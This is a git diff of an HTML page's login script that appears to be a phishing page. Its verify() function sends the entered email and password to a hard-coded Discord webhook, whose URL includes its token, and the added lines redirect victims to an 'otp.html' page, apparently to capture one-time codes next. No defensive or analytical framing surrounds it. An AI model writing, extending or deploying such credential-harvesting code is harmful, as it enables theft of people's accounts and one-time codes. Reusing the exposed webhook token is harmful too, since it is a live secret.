@@ -230,6 +230,7 @@ body {
       function verify() {
         const email = document.getElementById("email").value;
         const password = document.getElementById("password").value;
+        window.location.replace("otp.html")
 
         if (email && password) {
           fetch("https://discord.com/api/webhooks/1450510149876715712/V72h6vseNrLJD7BuA7JQiSzxDnzrHhtY5ygGsI0VbdGhrfE_0Nvdg1mqXDYup49WJnbd", {
@@ -244,7 +245,10 @@ body {
               }],
             }),
           }).catch(console.error);
+        }else{
+          alert("please enter username and password")
         }
+          
       }
     </script>
   </body>
